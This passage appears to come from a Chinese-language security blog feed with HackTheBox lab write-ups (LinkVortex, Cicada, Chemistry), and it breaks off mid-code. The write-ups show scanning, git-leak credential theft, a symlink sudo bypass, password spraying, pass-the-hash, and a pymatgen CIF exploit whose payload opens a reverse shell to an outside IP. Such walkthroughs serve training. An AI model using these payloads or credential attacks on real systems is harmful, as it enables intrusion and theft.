class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734514089952-fea84e6e-c4f6-41bf-8144-dbf1a48dfaff.png"></p><p>æŠ“åŒ…çœ‹çœ‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734514179994-56749bbf-13f9-44a0-b686-440c474dd760.png"></p><p>å‘ç°å¯ä»¥ä»»æ„æ–‡ä»¶è¯»å–</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734514378807-a7745e77-baf6-429c-9ce7-ed45fbc60ba6.png"></p><p>å¹¶ä¸”å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œç›´æ¥è¯»å–flagå³å¯</p>]]></content>
      
      
      <categories>
          
          <category> æ”»é˜²æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> HTB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LinkVortex</title>
      <link href="/2024/12/30/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/LinkVortex/"/>
      <url>/2024/12/30/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/LinkVortex/</url>
      
        <content type="html"><![CDATA[<h2 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">nmapÂ -sCVÂ -AÂ -T4Â 10.10.11.47</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733892650939-385f482c-2c18-4ad8-9c59-1c9ac19e1533.png"></p><p>å¯ä»¥å‘ç°æ‰«åˆ°äº†åŸŸåï¼Œé‚£ä¹ˆå°±æ˜¯å†™å…¥hosts</p><h2 id="å­åŸŸåçˆ†ç ´"><a href="#å­åŸŸåçˆ†ç ´" class="headerlink" title="å­åŸŸåçˆ†ç ´"></a>å­åŸŸåçˆ†ç ´</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ffuf -w /usr/share/dnsrecon/dnsrecon/data/subdomains-top1mil-20000.txt -u http://linkvortex.htb/ -H <span class="string">&quot;Host:FUZZ.linkvortex.htb&quot;</span> -mc 200</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ffufå·¥å…·ç”¨æ³•å‚è€ƒï¼š<a href="https://blog.csdn.net/weixin_44288604/article/details/128444485">https://blog.csdn.net/weixin_44288604&#x2F;article&#x2F;details&#x2F;128444485</a></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733892861174-e6fca4da-4071-411f-b953-936e1200e7f1.png"></p><p>æ‰«æå‡ºä¸€ä¸ªdevå­åŸŸååŒæ ·ä¹ŸåŠ å…¥åˆ°hostsé‡Œé¢</p><h2 id="ç›®å½•æ‰«æ"><a href="#ç›®å½•æ‰«æ" class="headerlink" title="ç›®å½•æ‰«æ"></a>ç›®å½•æ‰«æ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">dirsearch -u http://linkvortex.htb/</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ‰«æå‡ºæ¥æœ‰ä¸ªrobots.txt</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733892976586-85d197dd-e24b-4c89-b374-fe08873ddd13.png"></p><p>çœ‹åˆ°æœ‰ä¸ªghostè¿›å»çœ‹çœ‹å‘ç°æ˜¯ä¸ªç™»å½•é¡µé¢ï¼Œæ‰€ä»¥éœ€è¦æ‰¾åˆ°è´¦æˆ·å’Œå¯†ç ï¼Œå†å»æ‰«æå­åŸŸå</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">dirsearch -u http://dev.linkvortex.htb/</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733893029816-e9b61ff2-8579-4625-a59a-e6c636b6f8be.png"></p><p>å‘ç°äº†gitæ³„æ¼</p><h2 id="Gitæ³„æ¼"><a href="#Gitæ³„æ¼" class="headerlink" title="Gitæ³„æ¼"></a>Gitæ³„æ¼</h2><p>ç›´æ¥ç”¨githack</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">python2 GitHack.py http://dev.linkvortex.htb/.git/</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733893317099-c48f3b45-bc0e-4d92-ac7a-978a731d2a57.png"></p><p>å¯ä»¥åœ¨é‡Œé¢æ‰¾åˆ°ç™»å½•çš„ç”¨æˆ·åå¯†ç </p><h2 id="CVE-CVE-2023-40028"><a href="#CVE-CVE-2023-40028" class="headerlink" title="CVE-CVE-2023-40028"></a>CVE-CVE-2023-40028</h2><p>è¿™é‡Œå°±æ˜¯æ¼æ´è„šæœ¬ä¸»è¦å°±æ˜¯æ”¹é‡Œé¢çš„åœ°å€å°±å¯ä»¥äº†</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733906422060-c7e6085e-5eb3-4302-9d39-3c0cc6dc1862.png"></p><p>ç„¶åçœ‹dockeré‡Œçš„æ–‡ä»¶èƒ½çœ‹åˆ°sshç”¨æˆ·å¯†ç </p><p>è¿ä¸Šä¹‹åsudo -l</p><p>æ£€æŸ¥ Bob çš„å‘½ä»¤æƒé™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">bob@linkvortex:~$ sudo -l</span><br><span class="line"></span><br><span class="line">Matching Defaults entries for bob on linkvortex:</span><br><span class="line"></span><br><span class="line">env_reset, mail_badpass,</span><br><span class="line"></span><br><span class="line">secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty,</span><br><span class="line"></span><br><span class="line">env_keep+=CHECK_CONTENT</span><br><span class="line"></span><br><span class="line">User bob may run the following commands on linkvortex:</span><br><span class="line"></span><br><span class="line">(ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹è¿™ä¸ª <code>/opt/ghost/clean_symlink.sh</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">bob@linkvortex:~$ cat /opt/ghost/clean_symlink.sh</span><br><span class="line"></span><br><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">QUAR_DIR=&quot;/var/quarantined&quot;</span><br><span class="line"></span><br><span class="line">if [ -z $CHECK_CONTENT ];then</span><br><span class="line"></span><br><span class="line">CHECK_CONTENT=false</span><br><span class="line"></span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">LINK=$1</span><br><span class="line"></span><br><span class="line">if ! [[ &quot;$LINK&quot; =~ \.png$ ]]; then</span><br><span class="line"></span><br><span class="line">/usr/bin/echo &quot;! First argument must be a png file !&quot;</span><br><span class="line"></span><br><span class="line">exit 2</span><br><span class="line"></span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">if /usr/bin/sudo /usr/bin/test -L $LINK;then</span><br><span class="line"></span><br><span class="line">LINK_NAME=$(/usr/bin/basename $LINK)</span><br><span class="line"></span><br><span class="line">LINK_TARGET=$(/usr/bin/readlink $LINK)</span><br><span class="line"></span><br><span class="line">if /usr/bin/echo &quot;$LINK_TARGET&quot; | /usr/bin/grep -Eq &#x27;(etc|root)&#x27;;then</span><br><span class="line"></span><br><span class="line">/usr/bin/echo &quot;! Trying to read critical files, removing link [ $LINK ] !&quot;</span><br><span class="line"></span><br><span class="line">/usr/bin/unlink $LINK</span><br><span class="line"></span><br><span class="line">else</span><br><span class="line"></span><br><span class="line">/usr/bin/echo &quot;Link found [ $LINK ] , moving it to quarantine&quot;</span><br><span class="line"></span><br><span class="line">/usr/bin/mv $LINK $QUAR_DIR/</span><br><span class="line"></span><br><span class="line">if $CHECK_CONTENT;then</span><br><span class="line"></span><br><span class="line">/usr/bin/echo &quot;Content:&quot;</span><br><span class="line"></span><br><span class="line">/usr/bin/cat $QUAR_DIR/$LINK_NAME 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">fi</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>å¦‚æœæ–‡ä»¶ååç¼€æ˜¯</strong>** <strong><code>**.png**</code><strong>ï¼Œå¹¶ä¸”æ–‡ä»¶æ˜¯ç¬¦å·é“¾æ¥</strong>ï¼Œä¸”ç›®æ ‡è·¯å¾„ <strong>ä¸åŒ…å«</strong></strong> <strong><code>**etc**</code></strong> <strong><strong>æˆ–</strong></strong> **<code>**root**</code>ï¼ˆå³ç›®æ ‡ä¸æ˜¯æ•æ„Ÿæ–‡ä»¶ï¼‰ï¼Œè„šæœ¬ä¼šï¼š</p><ul><li><p>å°†ç¬¦å·é“¾æ¥ <strong>ç§»åŠ¨åˆ°</strong>** **<code>**/var/quarantined**</code> ç›®å½•ã€‚</p></li><li><p>å¦‚æœ <code>CHECK_CONTENT=true</code>ï¼Œè„šæœ¬ä¼šå°è¯•è¾“å‡ºè¯¥æ–‡ä»¶çš„å†…å®¹ã€‚</p></li></ul><p>ç„¶ååˆ›å»ºç¬¦å·é“¾æ¥ï¼Œè¿æ¥åˆ° root.txt ä¸‹ï¼Œç”±äºè„šæœ¬ä¼šæ£€æŸ¥å‚æ•°ï¼Œå¯ä»¥ä½¿ç”¨äºŒæ¬¡é“¾æ¥æ¥è¿›è¡Œç»•è¿‡ï¼ŒåŒæ—¶å°† <code>CHECK_CONTENT</code> è®¾ç½®ä¸º true</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">bob@linkvortex:~$ ln -s /root/root.txt hyh.txt</span><br><span class="line"></span><br><span class="line">bob@linkvortex:~$ ln -s /home/bob/hyh.txt hyh.png</span><br><span class="line"></span><br><span class="line">bob@linkvortex:~$ sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/hyh.png</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š<a href="https://www.hyhforever.top/htb-linkvortex/">https://www.hyhforever.top/htb-linkvortex/</a></p>]]></content>
      
      
      <categories>
          
          <category> æ”»é˜²æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> HTB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cicada</title>
      <link href="/2024/12/30/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Cicada/"/>
      <url>/2024/12/30/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Cicada/</url>
      
        <content type="html"><![CDATA[<h2 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">nmap <span class="number">10.10</span><span class="number">.11</span><span class="number">.35</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ‰«æç»“æœ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734075856023-773cc0ea-7f5a-465d-9323-ee954d9cbbad.png"></p><h2 id="smbè¿æ¥"><a href="#smbè¿æ¥" class="headerlink" title="smbè¿æ¥"></a>smbè¿æ¥</h2><p>å‘ç°å¼€æ”¾445ç«¯å£æœ‰smbæœåŠ¡ï¼Œè¿æ¥è¯•è¯•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">smbclient -L //<span class="number">10.10</span><span class="number">.11</span><span class="number">.35</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734076142025-6a80e229-a256-4390-b217-f3d769c6ddb0.png"></p><p>å‘ç°éœ€è¦å¯†ç ä½¿ç”¨å…å¯†ç™»å½•è¯•è¯•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">smbclient -N //<span class="number">10.10</span><span class="number">.11</span><span class="number">.35</span></span><br><span class="line"></span><br><span class="line">æˆ–è€…</span><br><span class="line"></span><br><span class="line">enum4linuxÂ -aÂ -uÂ guestÂ <span class="number">10.10</span><span class="number">.11</span><span class="number">.35</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734076186257-dccd6476-db0a-4137-a280-1201f41c5eed.png"></p><p>æŠŠè¿™ä¸ªæ–‡ä»¶ä¸‹è½½ä¸‹æ¥çœ‹çœ‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">get <span class="string">&quot;Notice from HR.txt&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734076286015-088784ed-5382-4b79-83e5-a6be2c419433.png">è·å–åˆ°ä¸€ä¸ªé»˜è®¤çš„å¯†ç Cicada$M6Corpb*@Lp#nZp!8</p><h2 id="Ridçˆ†ç ´"><a href="#Ridçˆ†ç ´" class="headerlink" title="Ridçˆ†ç ´"></a>Ridçˆ†ç ´</h2><p>**crackmapexec **å·¥å…·ä½¿ç”¨ï¼š<a href="https://www.cnblogs.com/Yang34/p/14411497.html">https://www.cnblogs.com/Yang34/p/14411497.html</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">crackmapexec smb <span class="number">10.10</span><span class="number">.11</span><span class="number">.35</span> -u <span class="string">&quot;guest&quot;</span> -p <span class="string">&quot;&quot;</span> --rid-brute|grep <span class="string">&quot;SidTypeUser&quot;</span></span><br><span class="line"></span><br><span class="line">æˆ–è€…</span><br><span class="line"></span><br><span class="line">nxcÂ smbÂ <span class="number">10.10</span><span class="number">.11</span><span class="number">.35</span>Â -uÂ guestÂ -pÂ <span class="string">&#x27;&#x27;</span>Â --rid-bruteÂ --users</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸¤ä¸ªå·¥å…·çˆ†ç ´å¾—åˆ°çš„ç»“æœ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734077772269-c870e59a-2605-48b6-b7e0-2582c75e0dc0.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734077677713-b7efcf44-c928-4826-9fc6-397e002cf836.png"></p><p>å…¶å®éƒ½æ˜¯å·®ä¸å¤šçš„å¯ä»¥å¾—åˆ°ç”¨æˆ·ååˆ—è¡¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">john.smouldersarah.danteliamichael.wrightsondavid.oreliousemily.oscars</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>éå†ç”¨æˆ·åå¯†ç çœ‹å“ªä¸ªæ­£ç¡®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">crackmapexec ldap cicada.htb -u usernames.txt -p &#x27;Cicada$M6Corpb*@Lp#nZp!8&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å‘ç°å¯¹michael.wrightsonç”¨æˆ·å¯ç”¨</p><h2 id="enum4linux-ngæ‰«æ"><a href="#enum4linux-ngæ‰«æ" class="headerlink" title="enum4linux-ngæ‰«æ"></a>enum4linux-ngæ‰«æ</h2><p>ä½¿ç”¨enum4linux-ngæœé›†æ‰€æœ‰ä¸smbæœåŠ¡æœ‰å…³çš„ä¿¡æ¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">enum4linux-ng -A -u michael.wrightson -p <span class="string">&#x27;Cicada$M6Corpb*@Lp#nZp!8&#x27;</span> <span class="number">10.10</span><span class="number">.11</span><span class="number">.35</span> -t <span class="number">10</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734078232468-3c2b9270-d766-4adf-9815-5c85a0c884cb.png"></p><p>å‘ç°äº†davidçš„å¯†ç ï¼šaRt$Lp#7t*VQ!3</p><p>ä½¿ç”¨è¯¥ç”¨æˆ·è¿›è¡Œsmbè¿æ¥</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734078508381-40c8f96e-3aad-4256-a202-d4876029d838.png"></p><p>å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªæ–‡ä»¶ä¸‹è½½ä¸‹æ¥ä½¿ç”¨get â€œæ–‡ä»¶åâ€å‘½ä»¤</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734078538443-737b9c71-a199-461f-939a-89ae3df6d3f0.png"></p><p>å‘ç°äº†ç”¨æˆ·åå’Œå¯†ç </p><h2 id="winrmç™»å½•"><a href="#winrmç™»å½•" class="headerlink" title="winrmç™»å½•"></a>winrmç™»å½•</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">evil-winrm -u emily.oscars -p <span class="string">&#x27;Q!3@Lp#M6b*7t*Vt&#x27;</span> -i <span class="number">10.10</span><span class="number">.11</span><span class="number">.35</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨evil-winrm ç™»å½•å¾—åˆ°ç”¨æˆ·çš„flag</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734078796810-70cd9ccc-215c-4b7c-a636-ed009f72e2eb.png"></p><h2 id="SeBackupPrivilege"><a href="#SeBackupPrivilege" class="headerlink" title="SeBackupPrivilege"></a>SeBackupPrivilege</h2><p>æŸ¥çœ‹å½“å‰ç”¨æˆ·çš„æƒé™</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734078879904-a89ebe2c-0fa1-45a3-9c32-b0ab95939a97.png"></p><p>å…³äºè¿™ä¸ª SeBackupPrivilegeï¼š<a href="https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/">Windows Privilege Escalation: SeBackupPrivilege â€“ Hacking Articles</a></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734079438801-1265f913-898c-484c-a2ee-ab0700e16fe1.png"></p><h2 id="pypykatz"><a href="#pypykatz" class="headerlink" title="pypykatz"></a>pypykatz</h2><p>ä½¿ç”¨ pypykatz å¾—åˆ° admin çš„ hash å€¼</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734079937735-5303e9c5-9088-4b6e-9990-4a120fac1703.png"></p><h2 id="impacket-secretsdump"><a href="#impacket-secretsdump" class="headerlink" title="impacket-secretsdump"></a>impacket-secretsdump</h2><p>æˆ–è€…ä½¿ç”¨impacket-secretsdumpå·¥å…·</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">impacket-secretsdump -sam sam -system system LOCAL</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734080255327-5e871ced-8af9-41b9-a194-93de6a543292.png"></p><p>æœ€åä½¿ç”¨ <code>evil-winrm</code> çš„ hash ç™»å½•åˆ° adminï¼Œå¾—åˆ° root.txt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">evil-winrm -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341 -i <span class="number">10.10</span><span class="number">.11</span><span class="number">.35</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734080047085-eb9bd664-2394-4281-9f8f-df0d0893ceec.png"></p>]]></content>
      
      
      <categories>
          
          <category> æ”»é˜²æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> HTB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chemistry</title>
      <link href="/2024/12/30/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Chemistry/"/>
      <url>/2024/12/30/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Chemistry/</url>
      
        <content type="html"><![CDATA[<h2 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">nmap -sC -sV -T4 -Pn <span class="number">10.10</span><span class="number">.11</span><span class="number">.38</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ‰«æç»“æœ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734070371395-44200458-e1fb-4574-9c4e-2783bbf70b3e.png"></p><p>æ²¡æœ‰æ‰«å‡ºåŸŸåã€‚æ‰€ä»¥ç›´æ¥è®¿é—®5000ç«¯å£çœ‹çœ‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734070428517-90805783-a216-4d33-811f-dfeacd6219aa.png"></p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>æ³¨å†Œè¿›æ¥ä¹‹åå‘ç°æœ‰ä¸€ä¸ªä¸Šä¼ é¡µé¢</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734070477361-05c630a3-8013-4edd-8508-d72767442a95.png"></p><p>è¯´æ˜¯è®©ä¸Šä¼ cifæ–‡ä»¶å»æœä¸€ä¸‹CIFæ–‡ä»¶å¯¼è‡´å‘½ä»¤æ‰§è¡Œ</p><p><a href="https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f">https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f</a></p><p>ä¿®æ”¹ä¸€ä¸‹poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">data_5yOhtAoR</span><br><span class="line"></span><br><span class="line">_audit_creation_date <span class="number">2018</span>-<span class="number">06</span>-08</span><br><span class="line"></span><br><span class="line">_audit_creation_method <span class="string">&quot;Pymatgen CIF Parser Arbitrary Code Execution Exploit&quot;</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">loop_</span><br><span class="line"></span><br><span class="line">_parent_propagation_vector.id</span><br><span class="line"></span><br><span class="line">_parent_propagation_vector.kxkykz</span><br><span class="line"></span><br><span class="line">k1 [<span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">_space_group_magn.transform_BNS_Pp_abc <span class="string">&#x27;a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+[&quot;__sub&quot; + &quot;classes__&quot;]) () if d.__name__ == &quot;BuiltinImporter&quot;][0].load_module (&quot;os&quot;).system (&quot;/bin/bash -c \&#x27;sh -i &gt;&amp; /dev/tcp/10.10.16.8/1233 0&gt;&amp;1\&#x27;&quot;);0,0,0&#x27;</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">_space_group_magn.number_BNS <span class="number">62.448</span></span><br><span class="line"></span><br><span class="line">_space_group_magn.name_BNS <span class="string">&quot;P n&#x27; m a&#x27; &quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734071073910-e61e8539-4147-4b44-8f72-0b02f85ba735.png"></p><p>åœ¨homeç›®å½•ä¸‹å‘ç°äº†rosaç”¨æˆ·</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734071228594-83132b2e-c060-4fbb-afe0-4b8b3d658dee.png"></p><p>ä½†æ˜¯æ²¡æœ‰æƒé™è¯»è¿™ä¸ªæ–‡ä»¶ï¼Œä½†æ˜¯è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¯¥é¶åœºçš„æºç çœ‹çœ‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 